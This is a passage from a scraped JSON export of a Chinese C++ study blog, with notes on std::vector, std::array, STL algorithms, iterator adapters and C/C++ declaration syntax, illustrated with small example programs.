12345std::vector&lt;Elem&gt;coll;if(!coll.empty())&#123; coll.pop_back();&#125; 关于效能，以下几种情况你可以预期安插动作和移除动作会快一些： 在容器的尾部安插或移除元素 容器的容量一开始就很大 安插多个元素调用一次肯定是最快的 Vector并能没有提供任何函数可以直接移除“与某个值相等”的所有元素。但是可以通过以下做法。 1234std::vector&lt;Elem&gt; coll;coll.erase(remove(coll.begin(),coll.end(), val), coll.end()); 如果只要一出第一个元素，可以这么做： 1234567std::vector&lt;Elem&gt; coll;pos = find(coll.begin(),coll.end(), val);if(pos != coll.end())&#123; coll.erase();&#125; 将vector当做C-Style Array使用reserve是容器预留空间，但并不真正创建元素对象，在创建对象之前，不能引用容器内的元素，因此当加入新的元素时，需要用push_back()/insert()函数。resize是改变容器的大小，并且创建对象，因此，调用这个函数之后，就可以引用容器内的对象了，因此当加入新的元素时，用operator[]操作符，或者用迭代器来引用元素对象。 1234std::vector&lt;char&gt; v;v.resize(41);strcpy(&amp;v[0],\"hello world\");printf(\"%s\\n\", &amp;v[0]); 初次接触这两个接口也许会混淆，其实接口的命名就是对功能的绝佳描述，resize就是重新分配大小，reserve就是预留一定的空间。这两个接口即存在差别，也有共同点。下面就它们的细节进行分析。为实现resize的语义，resize接口做了两个保证：一是保证区间[0, new_size)范围内数据有效，如果下标index在此区间内，vector[indext]是合法的。二是保证区间[0, new_size)范围以外数据无效，如果下标index在区间外，vector[indext]是非法的。reserve只是保证vector的空间大小(capacity)最少达到它的参数所指定的大小n。在区间[0, n)范围内，如果下标是index，vector[index]这种访问有可能是合法的，也有可能是非法的，视具体情况而定。resize和reserve接口的共同点是它们都保证了vector的空间大小(capacity)最少达到它的参数所指定的大小。 Class vectorvector特化版的内部只是用1bit存放元素，空间节省8倍。C++的最小可定址值是以byte为单位的，所以reference和iterator做特殊处理vector无法满足其他vector的所有规定，例如vector::reference并不是一个lvalue，vector::iterator也不是一个随机访问迭代器，而且它的操作速度会比一般的vector慢因为他是bit操作。flip函数用来取补数（complement）。注意，你可以对vector内的所有bit或单一bit调用filp，后者很值得注意，因为你也许会以为subscript操作符返回bool在对此基础类型调用filp是不可能的。然而vector运用了一个名为proxy的技巧：面对一个vector，subscript操作符的返回类型实际上是个辅助类，一旦你要求返回值为bool，便会触发一个自动类型转换函数。所有用于元素访问的函数，返回的都是reference类型。所以可以这么写： 12c.front().filp();c[5] = c.back(); 只有vector的non-const容器才会用到内部的proxy类型reference。而用来处理那些const成员函数，返回类型都是const reference，那就是bool。","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"notes","slug":"notes","permalink":"http://coordinate.wang/tags/notes/"},{"name":"cpp标准库","slug":"cpp标准库","permalink":"http://coordinate.wang/tags/cpp标准库/"}]},{"title":"STL容器（1）array","slug":"2017-04-22-STL容器1array","date":"2017-04-21T16:00:00.000Z","updated":"2018-02-18T03:29:06.321Z","comments":true,"path":"2017/04/22/2017-04-22-STL容器1array/","link":"","permalink":"http://coordinate.wang/2017/04/22/2017-04-22-STL容器1array/","excerpt":"","text":"Array为了使用array，首先必须加头文件 1#include &lt;array&gt; 该类型被定义为一个class template，在命名空间std中： 1234namespace std&#123; template &lt;typename T, size_t N&gt; class Array;&#125; 要注意的是Array并不支持分配器，也就是说不允许指定自己的allocator Array的能力Array会把元素复制到其内的static C-style array中。这些元素总是拥有一个明确次序。Array允许随机访问，你可以在常量时间内访问任何元素。Array的迭代器属于随机访问迭代器，所以你可以使用任意的STL算法。关于初始化，class array有一些独特的语法。注意，array是唯一一个“无任何东西被指定为初值时，会被与初始化”的容器。这意味着对于基础类型，初值可能不明确，而不是0。例如： 1std::array&lt;int,4&gt; x;elements of x have undefined value 这里要提一些什么是明确的初始化，对于明确的初始化，基础类型会被设定初值为0： 123int i1;//undefined valueint i2 = int();//initialized with zeroint i3&#123;&#125;;//initialized with zero array满足聚合体要求，因此可以使用处置列来设定array，聚合体（aggregate）是一个class或array，不带用户提供的构造函数，也没有private和protected的nostatic的数据成员，也没有base class ，也没有virtual函数。 1std::array&lt;int,3&gt; c = &#123;1,2,3&#125;; 如果初值列内的元素个数多余array的大小，这样的表达式就不对： 1std::array&lt;int,3&gt; c1 = &#123;1,2,3,4&#125;;//ERROR too many values 由于没有提供初值列而写的构造函数和assignment操作符，因此“在array声明期间完成初始化”是使用初值列的唯一途径。 12std::array&lt;int,3&gt; a(&#123;1,2,3&#125;);//ERROR std::vecotr&lt;int&gt; v(&#123;1,2,3&#125;);//OK swap拥有线性复杂度并有以下的影响：iterator和reference不会随着元素的置换而改变所指向的元素。所以置换后，iterator和reference指向那个原本容器，但指向不同元素。 Array的操作如果使用操作符=和swap()，两个array必须具备相同的类型，意思是两者的元素类型和大小必须相同。想要访问array内的所有元素，必须使用range-based for循环，或者特定的操作符或迭代器。通常只有使用at()会执行范围检查。如果超出范围，at()会抛出一个out_of_range异常，其它函数不会做检查。对于一个空的array调用operator[]、front和back会导致不明确的行为。 12std::array&lt;Elem,0&gt; c;std::cout &lt;&lt; c.front();//RUNTIME ERROR 将array当做C-Style Array如果想要访问array的元素，你不一定使用表达式&amp;a[0]，因为成员函数data()也具备相同用途： 1234std::array&lt;char,41&gt; a;strcpy(a.data(),\"hello\");printf(\"%s\\n\"，a.data());printf(\"%s\\n\"，&amp;a[0]); 但是你必须确保array的大小足够容纳复制进来的数据，而且如果你把其中的内容当做一个C-string来看，你必须放置一个’\\0’元素于尾端。注意，绝对不要用迭代器表现“第一元素的地址”。 12printf(\"%s\\n\", a.begin());//ERRORprintf(\"%s\\n\", a.data());//OK Tuple接口Array提供tuple接口。因此可以使用tuple_size&lt;&gt;::value去的元素个数，用tuple_element&lt;&gt;::type取得某个特定元素类型，用get取得某个特定元素。例如： 12345typedef std::array&lt;std::string,5&gt; FiveStrings;FiveStrings a = &#123; \"hello\",\"how\",\"are\",\"you\",\"hehe\"&#125;;std::tuple_size&lt;FiveStrings&gt;::value //5std::tuple_element&lt;1,FiveStrings&gt;::type //std::stringstd::get&lt;1&gt;(a) //std::string(\"how\")","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"notes","slug":"notes","permalink":"http://coordinate.wang/tags/notes/"},{"name":"cpp标准库","slug":"cpp标准库","permalink":"http://coordinate.wang/tags/cpp标准库/"}]},{"title":"标准模板库(2)","slug":"2017-04-20-标准模板库2","date":"2017-04-19T16:00:00.000Z","updated":"2018-02-18T03:29:06.254Z","comments":true,"path":"2017/04/20/2017-04-20-标准模板库2/","link":"","permalink":"http://coordinate.wang/2017/04/20/2017-04-20-标准模板库2/","excerpt":"","text":"更易型算法(Manipulating Algorithm)现实中存在某些限制和某些需要避开的事物，其中许多和元素/容器的改动相伴相生。有些算法会改变目标的区间。 移除(Removing)元素分析这个例子： 123456789101112131415161718192021222324252627#include &lt;algorithm&gt;#include &lt;iterator&gt;#include &lt;list&gt;#include &lt;iostream&gt;using namespace std;int main()&#123; list&lt;int&gt; coll; // insert elements from 6 to 1 and 1 to 6 for (int i=1; i&lt;=6; ++i) &#123; coll.push_front(i); coll.push_back(i); &#125; // print all elements of the collection cout &lt;&lt; \"pre: \"; copy (coll.cbegin(), coll.cend(), // source ostream_iterator&lt;int&gt;(cout,\" \")); // destination cout &lt;&lt; endl; // remove all elements with value 3 remove (coll.begin(), coll.end(), // range 3); // value // print all elements of the collection cout &lt;&lt; \"post: \"; copy (coll.cbegin(), coll.cend(), // source ostream_iterator&lt;int&gt;(cout,\" \")); // destination cout &lt;&lt; endl;&#125; 注意这个程序的结果和我们预想的不一样： 12pre: 6 5 4 3 2 1 1 2 3 4 5 6post: 6 5 4 2 1 1 2 4 5 6 5 6 remove并没有改变集合中的元素数量。cend返回的是当初那个终点，size()返回的还是当初那个大小。事实上，这个算法返回一个新终点。你可以利用这个新终点获得新区间。改进版本： 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;algorithm&gt;#include &lt;iterator&gt;#include &lt;list&gt;#include &lt;iostream&gt;using namespace std;int main()&#123; list&lt;int&gt; coll; // insert elements from 6 to 1 and 1 to 6 for (int i=1; i&lt;=6; ++i) &#123; coll.push_front(i); coll.push_back(i); &#125; // print all elements of the collection copy (coll.cbegin(), coll.cend(), ostream_iterator&lt;int&gt;(cout,\" \")); cout &lt;&lt; endl; // remove all elements with value 3 // - retain new end list&lt;int&gt;::iterator end = remove (coll.begin(), coll.end(), 3); // print resulting elements of the collection copy (coll.begin(), end, ostream_iterator&lt;int&gt;(cout,\" \")); cout &lt;&lt; endl; // print number of removed elements cout &lt;&lt; \"number of removed elements: \" &lt;&lt; distance(end,coll.end()) &lt;&lt; endl; // remove \"removed\" elements coll.erase (end, coll.end()); // print all elements of the modified collection copy (coll.cbegin(), coll.cend(), ostream_iterator&lt;int&gt;(cout,\" \")); cout &lt;&lt; endl;&#125; 如果真想把那些删除的元素斩草除根，erase正适用于此目的。为什么算法不自己调用erase呢？这正是STL为了获取弹性付出的代价。通过“以迭代器为接口”，STL将数据结构和算法分离出来。任何“以迭代器访问容器”的算法，都不得通过迭代器调用容器类所提供的任何成员函数。算法的操作对象不一定是“容器内的全部元素”所形成的区间，而可以使那些元素的子集。注意，通常并无必要删除那些“已被删除”的元素。以逻辑终点取代容器的实际终点，通常就足以应对现实情况。 更易Associative(关联式)和Unordered(无序)容器更易型算法(指那些会移除，重排，修改元素的算法)若用于关联式容器或无序容器，会出问题。如果更易型算法用于关联式和无序容器身上，会改变某位置上的值，进而破会容器本身对次序的维护。关联式容器和无序容器的所有迭代器均被申明为指向常量的value或key，如果你更动关联式容器或无序容器的元素会导致编译出错。 算法VS成员函数如果高效能是你的首要目标，你应该总是优先选用成员函数。 以函数作为算法的实参有些算法可以接受用户自定义的辅助函数，提高弹性和能力。 判断式(Predicate)Predicate是一种特殊的辅助函数。所谓的predicate，它会返回布尔值。单参数判断式(Unary Predicate)会检查唯一实参的某项特性。双参判断式(Binary Predicate)Binary Predicate的典型用途是，比较两个实参的特定属性。 使用Lambda可以定义对象，用于描述函数行为，并将这些对象以“inline实参”形式给算法作为predicate。 函数对象(Function Object)定义一个函数对象函数对象是一种带状态的函数。事实上，在同一时间点，相同类型的两个不同的函数对象所表述的相同机能，可具备不同状态。这是寻常函数中不可能的。另一个好处是，你可以在运行期初始化他们—当然必须在他们被调用之前。每个函数对象有其自己的类型。寻常函数，唯有在其signature不同时，才算类型不同。而函数对象即使signature相同，也可以有不同的类型。函数对象通常比寻常函数速度快。由于更多细节在编译器就已确定，所以通常可能进行更好的优化。 预定义的函数对象C++标准库内含若干预定义的函数对象，含盖了许多基础运算。一个典型的例子是作为基础排序的函数对象。operator &lt; 默认排序准则是调用less&lt;&gt;，所以，如果你声明： 1set&lt;int&gt; coll; 会被扩展为 1ser&lt;int,less&lt;int&gt;&gt; coll; binder你可以使用特殊的函数适配器，所谓的binder，将于定义的函数对象和其他数值结合为一体。 1234567891011121314151617181920212223242526272829303132333435363738#include &lt;set&gt;#include &lt;deque&gt;#include &lt;algorithm&gt;#include &lt;iterator&gt;#include &lt;functional&gt;#include &lt;iostream&gt;#include \"print.hpp\"using namespace std;using namespace std::placeholders;int main()&#123; set&lt;int,greater&lt;int&gt;&gt; coll1 = &#123; 1, 2, 3, 4, 5, 6, 7, 8, 9 &#125;; deque&lt;int&gt; coll2; // Note: due to the sorting criterion greater&lt;&gt;() elements have reverse order: PRINT_ELEMENTS(coll1,\"initialized: \"); // transform all elements into coll2 by multiplying them with 10 transform (coll1.cbegin(),coll1.cend(), // source back_inserter(coll2), // destination bind(multiplies&lt;int&gt;(),_1,10)); // operation PRINT_ELEMENTS(coll2,\"transformed: \"); // replace value equal to 70 with 42 replace_if (coll2.begin(),coll2.end(), // range bind(equal_to&lt;int&gt;(),_1,70), // replace criterion 42); // new value PRINT_ELEMENTS(coll2,\"replaced: \"); // remove all elements with values between 50 and 80 coll2.erase(remove_if(coll2.begin(),coll2.end(), bind(logical_and&lt;bool&gt;(), bind(greater_equal&lt;int&gt;(),_1,50), bind(less_equal&lt;int&gt;(),_1,80))), coll2.end()); PRINT_ELEMENTS(coll2,\"removed: \");&#125; 通过指定： 1bind(multiplies&lt;int&gt;(),_1,10) 变定义一个函数对象，将传入的第一个实参乘以10。最后一例用的是binder的组合： 123bind(logical_and&lt;bool&gt;(), bind(greater_equal&lt;int&gt;(),_1,50), bind(less_equal&lt;int&gt;(),_1,80)) 表现出的是个unary predicate，拥有参数x，操作意义是x&gt;=50&amp;&amp;x&lt;=80。 STL内部的错误和异常错误处理(Error Handling)C++标准库指出，对于STL的任何运用，如果违反规则，将导致不明确的行为。通常会导致不明确的内存访问，这肯能导致难缠的副作用。具体地说，使用STL，必须满足以下条件：迭代器必须合法有效。例如你必须在使用他们之前先将他们初始化。迭代器如果指向past-the-end位置，它并不指向任何对象。因此不能对他调用operator*和operator-&gt;。区间(range)必须合法：用以“指出某个区间”的前后迭代器必须指向同一个容器。从第一个迭代器出发必须可以到达第二个迭代器位置。如果涉及的区间不止一个，第二区间及后继各区间必须拥有“至少和第一区间一样多的”元素。腹泻操作中的“标的区间”必须拥有足够多的元素，否则必须采用insert iterator以下例子展示若干可能发生的错误： 1234567891011121314151617181920212223242526272829#include &lt;vector&gt;#include &lt;algorithm&gt;using namespace std;int main()&#123; vector&lt;int&gt; coll1; // empty collection vector&lt;int&gt; coll2; // empty collection // RUNTIME ERROR: // - beginning is behind the end of the range vector&lt;int&gt;::iterator pos = coll1.begin(); reverse (++pos, coll1.end()); // insert elements from 1 to 9 into coll1 for (int i=1; i&lt;=9; ++i) &#123; coll1.push_back (i); &#125; // RUNTIME ERROR: // - overwriting nonexisting elements copy (coll1.cbegin(), coll1.cend(), // source coll2.begin()); // destination // RUNTIME ERROR: // - collections mistaken // - cbegin() and cend() refer to different collections copy (coll1.cbegin(), coll2.cend(), // source coll1.end()); // destination&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"notes","slug":"notes","permalink":"http://coordinate.wang/tags/notes/"},{"name":"cpp标准库","slug":"cpp标准库","permalink":"http://coordinate.wang/tags/cpp标准库/"}]},{"title":"标准模板库(1)","slug":"2017-04-19-标准模板库1","date":"2017-04-18T16:00:00.000Z","updated":"2018-02-18T03:29:06.237Z","comments":true,"path":"2017/04/19/2017-04-19-标准模板库1/","link":"","permalink":"http://coordinate.wang/2017/04/19/2017-04-19-标准模板库1/","excerpt":"","text":"容器(Container)序列式容器(Sequence container):array,vector,deque,list and forward_list关联式容器(Associative container):set,multiset,map and multimap无序容器:(Unordered(associative)container):unordered_set,unordered_multiset,unordered_map,unordered_multimap 序列式容器(Sequence container)自c++11开始，c++标准库提供另一个list容器：forward list。forward list是一个单向链表。因此，forward list原则上就是一个受限的list，你无法查找某个元素然后删除它，或是在他的前面安插另一个元素。因此，为了删除某个元素，你必须位于其前一个元素的位置上，因为正是那个元素，才决定一个新的后继元素。也因此，forward list对此提供了一个特殊的成员函数erase_after()例子： 1234567891011121314151617#include &lt;forward_list&gt;#include &lt;iostream&gt;using namespace std;int main()&#123; // create forward-list container for some prime numbers forward_list&lt;long&gt; coll = &#123; 2, 3, 5, 7, 11, 13, 17 &#125;; // resize two times // - note: poor performance coll.resize(9); coll.resize(10,99); // print all elements: for (auto elem : coll) &#123; cout &lt;&lt; elem &lt;&lt; ' '; &#125; cout &lt;&lt; endl;&#125; 关联式数组(Associative Array)不论map或unordered map，都是key/value pair形成的集合，每个元素都带着独一无二的key。这样的集合也可以被视为一个关联式数组，也就是“索引并非整数”的array。也因此，刚才说的两个容器，都可以使用[]操作符。 123456789101112131415161718192021222324252627#include &lt;unordered_map&gt;#include &lt;string&gt;#include &lt;iostream&gt;using namespace std;int main()&#123; // type of the container: // - unordered_map: elements are key/value pairs // - string: keys have type string // - float: values have type float unordered_map&lt;string,float&gt; coll; // insert some elements into the collection // - using the syntax of an associative array coll[\"VAT1\"] = 0.16; coll[\"VAT2\"] = 0.07; coll[\"Pi\"] = 3.1415; coll[\"an arbitrary number\"] = 4983.223; coll[\"Null\"] = 0; // change value coll[\"VAT1\"] += 0.03; // print difference of VAT values cout &lt;&lt; \"VAT difference: \" &lt;&lt; coll[\"VAT1\"] - coll[\"VAT2\"] &lt;&lt; endl;&#125; 自C++11开始，你也可以使用at()访问元素的value，只要传给他key就行。这种情况下如果容器内找不到给定的key，会导致out_of_range异常: 1coll.at(\"VAT1\") = 0.1; 使用map与使用unordered_map的差异在于，元素在unordered_map的次序有各种可能，但元素在map内一定是排序过的。但由于unordered_map的操作属于“amortized constant”复杂度，map提供的是“对数复杂度”，所以通常宁可使用unordered_map而放弃map，除非你需要排序。容器适配器(Container Adapter)Stack 名字足以说明。Stack容器对元素采取的是LIFO(后进先出)管理策略。Queue 对元素采取FIFO(先进先出)管理策略。也就是说，他就是一个寻常的缓冲区(buffer)。Priority queue 其内的元素拥有各种优先权。所谓的优先权是基于程序员提供的排序准则(默认为操作符&lt;)而定义。迭代器(Iterator)任何容器都定义两种迭代器类型： container::iterator以“读/写”模式遍历元素。 container::const_iterator以“只读”模式遍历元素。 我们可以使用关键字auto代替迭代器的精确类型。因此我们直接以begin初始化迭代器，就可以使用auto声明其类型： 12for(auto pos = coll.begin(); pos != coll.end(); ++pos) cout &lt;&lt; *pos &lt;&lt; endl; 采用这种写法，万一容器类型发生变化，程序整体仍能保持较佳的健壮性。然而其缺点是，迭代器丧失常量性，可能引发“计划外的赋值”风险。因为 1auto pos = coll.begin(); 会使pos是一个非常量迭代器，因为begin()返回的是个类型为cont::iterator的对象。为确保仍可使用常量迭代器，自C++11起容器提供cbegin和cend，他们放回一个cont::const_iterator的对象。 算法(Algorithm)区间(Range)所有算法处理的都是半开区间(half-open range)—包括其实元素的位置但并不包括末尾元素的位置。半开区间的有点主要是单纯，可免除对空集做特殊处理。当然，金无足赤，世上没有完美的设计。例子： 123456789101112131415161718192021222324252627282930#include &lt;algorithm&gt;#include &lt;list&gt;#include &lt;iostream&gt;using namespace std;int main()&#123; list&lt;int&gt; coll; // insert elements from 20 to 40 for (int i=20; i&lt;=40; ++i) &#123; coll.push_back(i); &#125; // find position of element with value 3 // - there is none, so pos3 gets coll.end() auto pos3 = find (coll.begin(), coll.end(), // range 3); // value // reverse the order of elements between found element and the end // - because pos3 is coll.end() it reverses an empty range reverse (pos3, coll.end()); // find positions of values 25 and 35 list&lt;int&gt;::iterator pos25, pos35; pos25 = find (coll.begin(), coll.end(), // range 25); // value pos35 = find (coll.begin(), coll.end(), // range 35); // value // print the maximum of the corresponding range // - note: including pos25 but excluding pos35 cout &lt;&lt; \"max: \" &lt;&lt; *max_element (pos25, pos35) &lt;&lt; endl; // process the elements including the last position cout &lt;&lt; \"max: \" &lt;&lt; *max_element (pos25, ++pos35) &lt;&lt; endl;&#125; 查找元素3的任务失败后，find()返回区间的结束位置并赋值给pos3。所以reverse()的结果就是相当于： 1reverse(coll.end(), coll.end()); 处理多重区间(Multiple Ranges)有数个算法可以同时处理多重区间。通常你必须设定第一区间的起点和终点，至于其他区间，只需设定起点即可，终点通常可由第一区间的元素数量推导出来。例如，equal从头开始比较coll1和coll2的所有元素： 1234if( equal(coll1.begin(), coll1,end(), coll.begin())&#123; ...&#125; 于是，coll2之中参与比较的元素数量，间接取决于coll1内的数量。这使得我们获得一个重要的心得：如果某个算法用来处理多重区间，那么当你调用它时，务必确保第二区间所拥有的元素个数至少和第一区间内的元素个数相同。注意下面这个例子： 12345678910111213141516#include &lt;algorithm&gt;#include &lt;list&gt;#include &lt;vector&gt;using namespace std;int main()&#123; list&lt;int&gt; coll1 = &#123; 1, 2, 3, 4, 5, 6, 7, 8, 9 &#125;; vector&lt;int&gt; coll2; // RUNTIME ERROR: // - overwrites nonexisting elements in the destination copy (coll1.cbegin(), coll1.cend(), // source coll2.begin()); // destination //...&#125; 想要避免上面的错误，你可以确定目标区间内有足够的元素空间，或是采用insert iterator。为了是目标区间足够大，你可以一开始给他一个正确的大小，也可以显示的变更他的大小。 123456789101112131415161718192021222324252627#include &lt;algorithm&gt;#include &lt;list&gt;#include &lt;vector&gt;#include &lt;deque&gt;using namespace std;int main()&#123; list&lt;int&gt; coll1 = &#123; 1, 2, 3, 4, 5, 6, 7, 8, 9 &#125;; vector&lt;int&gt; coll2; // resize destination to have enough room for the overwriting algorithm coll2.resize (coll1.size()); // copy elements from first into second collection // - overwrites existing elements in destination copy (coll1.cbegin(), coll1.cend(), // source coll2.begin()); // destination // create third collection with enough room // - initial size is passed as parameter deque&lt;int&gt; coll3(coll1.size()); // copy elements from first into third collection copy (coll1.cbegin(), coll1.cend(), // source coll3.begin()); // destination&#125; 注意这两种做法都会产生新元素并赋初值。这些元素由default构造函数初始化，没有任何实参。你可以传递额外的实参给构造函数和resize()，这样就可以按你的意思将新元素初始化。 迭代器之适配器(Iterator Adapter)C++11标准库提供了数个预定义的特殊迭代器，亦即所谓迭代器适配器(iterator adapter)。 Insert Iterator(安插型迭代器)它可以使算法以安插方式而非覆写方式运作。使用它可以解决算法的“目标空间不足”问题。她会促使目标区间的大小按需求成长。Insert iterator内部将接口做了新的定义：如果你将某个元素赋值，会引发“对其所属集合的按插动作”。至于插入位置是在容器的最前或最后，或某特定位置上，要视三种不同的insert iterator而定。单步前行不会构成任何动静。 123456789101112131415161718192021222324252627282930#include &lt;algorithm&gt;#include &lt;iterator&gt;#include &lt;list&gt;#include &lt;vector&gt;#include &lt;deque&gt;#include &lt;set&gt;#include &lt;iostream&gt;using namespace std;int main()&#123; list&lt;int&gt; coll1 = &#123; 1, 2, 3, 4, 5, 6, 7, 8, 9 &#125;; // copy the elements of coll1 into coll2 by appending them vector&lt;int&gt; coll2; copy (coll1.cbegin(), coll1.cend(), // source back_inserter(coll2)); // destination // copy the elements of coll1 into coll3 by inserting them at the front // - reverses the order of the elements deque&lt;int&gt; coll3; copy (coll1.cbegin(), coll1.cend(), // source front_inserter(coll3)); // destination // copy elements of coll1 into coll4 // - only inserter that works for associative collections set&lt;int&gt; coll4; copy (coll1.cbegin(), coll1.cend(), // source inserter(coll4,coll4.begin())); // destination&#125; 这个例子运用了三个预定义的insert iteratorBack inserter其内部调用push_back()，在容器末尾插入元素。Front inserter其内部调用push_front()，将元素安插于容器最前端。General inserter这种一般性的inserter，简称inserter，它的作用是在“初始化时接受第二实参”所指位置的前方插入元素。其内部调用成员函数insert()，因此这是唯一可用于关联式容器身上的一种预定义inserter。 Stream Iterator(串流迭代器)Stream Iterator被用来读写stream。他们提供了必要的抽象性，使得来自键盘的输入像是个集合，你能够从中读取内容。同样道理，你也可以把一个算法输出结果重新导向到某个文件或屏幕上。 123456789101112131415161718192021222324252627#include &lt;iterator&gt;#include &lt;algorithm&gt;#include &lt;vector&gt;#include &lt;string&gt;#include &lt;iostream&gt;using namespace std;int main()&#123; vector&lt;string&gt; coll; // read all words from the standard input // - source: all strings until end-of-file (or error) // - destination: coll (inserting) copy (istream_iterator&lt;string&gt;(cin), // start of source istream_iterator&lt;string&gt;(), // end of source back_inserter(coll)); // destination // sort elements sort (coll.begin(), coll.end()); // print all elements without duplicates // - source: coll // - destination: standard output (with newline between elements) unique_copy (coll.cbegin(), coll.cend(), // source ostream_iterator&lt;string&gt;(cout,\"\\n\")); // destination&#125; istream_iterator(cin)会产生一个可从“标准输入串流cin”读取数据的stream iterator。其中的template实参string表示这个stream iterator专门读取这个类型的元素。这些元素通过一般的operator &gt;&gt; 被读取出来。 Reverse Iterator(反向迭代器)Reverse iterator会造成算法逆向操作。所有提供双向迭代器或随机访问迭代器的容器都可以通过他们的成员函数rbegin和rend产生一个反向迭代器。自C++11开始还提供一组对应成员函数crbegin和crend，它们会返回只读反向迭代器。Forward_list和所有无序容器都没有提供回向迭代接口，即rbegin和rend等等。原因是那些容器内部实现只是使用singly linked list传奇所有元素。 1234567891011121314151617181920#include &lt;iterator&gt;#include &lt;algorithm&gt;#include &lt;vector&gt;#include &lt;iostream&gt;using namespace std;int main()&#123; vector&lt;int&gt; coll; // insert elements from 1 to 9 for (int i=1; i&lt;=9; ++i) &#123; coll.push_back(i); &#125; // print all element in reverse order copy (coll.crbegin(), coll.crend(), // source ostream_iterator&lt;int&gt;(cout,\" \")); // destination cout &lt;&lt; endl;&#125; 采用reverse iterator，所有算法便可以不需特殊处理就以相反方向操作容器，这自然是美事一桩。","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"notes","slug":"notes","permalink":"http://coordinate.wang/tags/notes/"},{"name":"cpp标准库","slug":"cpp标准库","permalink":"http://coordinate.wang/tags/cpp标准库/"}]},{"title":"理解C/C++语言的声明语法-声明子","slug":"2017-04-18-理解C++语言的声明语法","date":"2017-04-17T16:00:00.000Z","updated":"2018-02-18T03:29:06.221Z","comments":true,"path":"2017/04/18/2017-04-18-理解C++语言的声明语法/","link":"","permalink":"http://coordinate.wang/2017/04/18/2017-04-18-理解C++语言的声明语法/","excerpt":"","text":"转载自dreamliner的blog 声明一些声明可能难以理解，特别是如果声明几个不同类型的名字或者那些指向函数指针的函数。例如在§10.1.1/171中，我们看到 1int* p, q; 定义p为一个“整型指针”类型的对象，q为一个整型对象。在§10.1.2/173中，我们看到 1double (*get_analysis_ptr())(const vector&lt;Student_info&gt;&amp;); 声明get_analysis_ptr为一个函数，不带任何参数，它返回一个指针，它指向一个函数，它带有一个const vector&lt;Student_info&gt;&amp;参数，返回double。你可以通过重写以清楚的表达这些声明的含义，例如 12int* p;int q; 和 123// 定义analysis_fp为一个函数，它带一个const vector&lt;Student_info&gt;&amp;参// 数，返回一个double类型。typedef double (*analysis_fp)(const vector&lt;Student_info&gt;&amp;);analysis_fp get_analysis_ptr(); 不幸的是，这种策略不会帮助你阅读其它程序员代码中令人迷惑的声明。一般，一个声明大致如下声明语句：声明说明符[声明子[初始化器]] [,声明子[初始化器]]…;它为每一个声明子声明一个名字。这些名字始于声明开始的地方终于声明作用域结束的地方。一些声明同时也是定义。名字可以声明多次，但是仅能定义一次。如果一个声明分配了存储空间或者定义了类或函数体，那么它也是一个定义。C++继承了C的声明语法。理解声明的关键是认识到每个声明包含两个部分：一系列声明说明符，它们一起说明一个类型和其它正在声明的特性，紧跟着是零个或多个声明子（每个声明子都可选的有一个关联的初始化器）。根据说明符和声明子的形式，每个声明子都为名字赋予一个类型。理解声明的第一步是定位说明符和声明子的边界。这很容易：所有的说明符都是关键字或者类型名，因此说明符终止于第一个不是以上类型之一的符号。例如，在 1const char * const * const * cp; 很容易找到边界：double是一个类型，左括号后面既不是关键字也不是类型名。因此，声明—说明符只是double，声明子为声明的其它部分，不包含分号。 1double (*get_analysis_ptr())(const vector&lt;Student_info&gt;&amp;); 另一个例子，考虑§10.1.2/173中的声明：第一个既不是关键字也不是类型名的符号是，因此说明符是const char，唯一的声明子 const const cp。 说明符（Specifiers）我们可以将声明—说明符分成三个部分：类型说明符，存储类说明符，和其它说明符：声明说明符：{类型说明符|存储类说明符|其它声明说明符}然而，这种划分仅仅有助于理解，因为声明本身不存在对应的划分：声明—说明符可以以任何次序出现。类型说明符决定了声明的类型。我们在§A.2/299中讨论内置类型。 123type-specifier: char | wchar_t | bool | short | int | long | signedunsigned | float | double | void | type-name | const | volatiletype-name: class-name | enum-name | typedef-name const说明符指出这种类型的对象不可以修改，volatile通知编译器变量可能以非语言定义的形式改变，应该避免优化。注意const既可以出现在说明符部分，这样修改类型，也可以出现在声明子部分，说明一个const指针。这没有任何歧义，因为声明子部分的const总是跟着一个*。存储类说明符决定变量的位置和生命周期： 1storage-class-specifiers: register | static | extern | mutable register说明符建议编译器通过将此对象放到寄存器中以优化性能。一般，局部变量在退出声明它们的块（block）时即被销毁；静态变量的值在作用域的入口和出口间会被保存起来。extern说明符表明当前的声明不是一个定义，隐含着在其它地方存在相应的定义。mutable存储类仅用于类的数据成员，并且允许修改这些数据成员即使它们是常量对象的成员。其它声明说明符定义了与类型无关的属性： 1other-decl-specifier: friend | inline | virtual | typedef friend说明符(§12.3.2/216 and §13.4.2/246)改写保护。内联说明符用于函数定义，提示编译器如果可能内联下面的代码。当展开调用时，函数定义必须出现在那个作用域，因此将内联函数体放到声明函数的头文件中通常是一个好主意。virtual说明符(§13.2.1/234)仅用于成员函数，表示这个函数是动态绑定的。typedef说明符(§3.2.2/43)定义类型的同义词。 声明子（Declarators）一个声明为每个声明子都声明一个实体（entity）,同时为那个实体给出一个名字，并且隐含的给出存储类，类型，和由说明符给出的其它特性。说明符和声明子一起决定了名字是否是一个对象，数组，指针，引用或函数。例如，声明x为一个整型指针，f为一个函数返回一个整型。正是声明子*x和f()使类型x和f产生区别。 12345678int *x, f();declarator: [ * [ const ] | &amp; ]... direct-declaratordirect-declarator: declarator-id | ( declarator ) |direct-declarator ( parameter-declaration-list ) |direct-declarator [ constant-expression ]A declarator-id is an identifier, possibly qualified:declarator-id: [ nested-name-specifier ] identifiernested-name-specifier: &#123; class-or-namespace-name ::&#125;... 如果声明子是一个仅包含一个declarator-id的直接-声明子，那么这说明这个标识符具有decl-specifiers隐含的属性，而没有进一步的修饰。例如，在下面的声明中 1int n; 